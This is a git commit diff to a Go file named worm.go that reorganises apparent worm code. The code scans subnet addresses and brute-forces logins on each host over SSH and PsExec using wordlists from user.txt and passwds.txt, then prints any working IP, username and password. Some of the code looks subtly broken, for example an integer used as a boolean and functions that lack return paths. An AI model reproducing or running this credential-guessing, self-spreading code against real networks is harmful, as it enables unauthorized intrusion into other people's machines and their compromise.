f75690b21434fafceba63f0cba467e2c8ad5383c
srl3630 <samrlipton@gmail.com>
2018-11-28 08:24:13 -0500

    organized code a bit in worm

--- gofiles/worm.go
+++ gofiles/worm.go
@@ -39,13 +39,8 @@ func main() {
 
 func startwormingboi(myos string) {
 
-	var user = readinfile("user.txt")
-	var passwds = readinfile("passwds.txt")
-	for _, username := range (user) {
-		for _, password := range (passwds) {
-			pysexec(username, password)
-		}
-	}
+
+
 
 	var subnets = ""
 	if len(os.Args) == 1 {
@@ -53,6 +48,7 @@ func startwormingboi(myos string) {
 	} else {
 		subnets = os.Args[1]
 	}
+	//Create random ips
 	var step = [3]string{"10", "30", "40"}
 	var myip = ""
 	var wg sync.WaitGroup
@@ -60,45 +56,34 @@ func startwormingboi(myos string) {
 		myip = subnets + element
 		fmt.Println(myip)
 		wg.Add(1)
-		go gettingin(myip, user, passwds, &wg, myos)
+		// CHANGEME
+		targetos := "windows"
+		go gettingin(myip, &wg, myos, targetos)
 	}
 	wg.Wait()
 }
 
-func gettingin(myip string, user []string, passwds []string, wg *sync.WaitGroup, myos string, targetos string) {
-	var passbreak = false
+func gettingin(myip string, wg *sync.WaitGroup, myos string, targetos string) {
+
+	try_creds(myip,targetos)
+	defer wg.Done()
+}
+
+func try_creds(myip string, targetos string){
+	var user = readinfile("user.txt")
+	var passwds = readinfile("passwds.txt")
+	iswork := false
+	username := "username"
+	password := "password"
 	switch targetos {
 	case "windows":
-		for j := 0; j < len(user); j++ {
-			for k := 0; k < len(passwds); k++ {
-				switch myos {
-				case "windows":
-					wincon := getinwin(myip, user[j], passwds[k])
-					switch wincon {
-					case 1:
-						fmt.Println("Im in windows with", myip, user[j], passwds[k])
-						passbreak = true
-						break
-					case 2:
-						fmt.Printf("\n didnt work windows with %s %s %s", myip, user[j], passwds[k])
-					default:
-						fmt.Println("target machine does not have psexec enabled")
-					}
-				default:
-					fmt.Println("cant get onto windows from nonwindows :(")
-					passbreak = true
-					break
-
-				}
-				if passbreak {
-					break
-				}
-			}
-		}
+		iswork, username, password = perform_psexec(myip,user,passwds)
 	case "linux":
-		iswork, username, password := perform_ssh(myip,user,passwds)
+		iswork, username, password = perform_ssh(myip,user,passwds)
 	}
-	defer wg.Done()
+	if iswork {
+		fmt.Println( "ip:",myip,"username:",username,"password:", password)
+	}
 }
 func perform_ssh(myip string,user []string, passwds []string)(iswork bool, username string, password string){
 	n := 0
@@ -107,6 +92,45 @@ func perform_ssh(myip string,user []string, passwds []string)(iswork bool, usern
 			n = len(getinssh(myip, user[j], passwds[k]))
 			if n {
 				return true, user[j], passwds[k]
+			}
+		}
+	}
+}
+
+func perform_psexec(myip string, user []string, passwds []string)(result bool, username string, password string) {
+	passbreak := true
+	myos := runtime.GOOS
+	for j := 0; j < len(user); j++ {
+		for k := 0; k < len(passwds); k++ {
+			switch myos {
+			case "windows":
+				wincon := getinwin(myip, user[j], passwds[k])
+				switch wincon {
+				case 1:
+					fmt.Println("Im in windows with", myip, user[j], passwds[k])
+					username = user[j]
+					password = passwds[k]
+					result = true
+					passbreak = true
+					break
+				case 2:
+					fmt.Printf("\n didnt work windows with %s %s %s", myip, user[j], passwds[k])
+					result=false
+				default:
+					fmt.Println("target machine does not have psexec enabled")
+					result = false
+					passbreak = true
+					break
+				}
+			default:
+				fmt.Println("cant get onto windows from nonwindows :(")
+				result=false
+				passbreak = true
+				break
+
+			}
+			if passbreak {
+				break
 			}
 		}
 	}
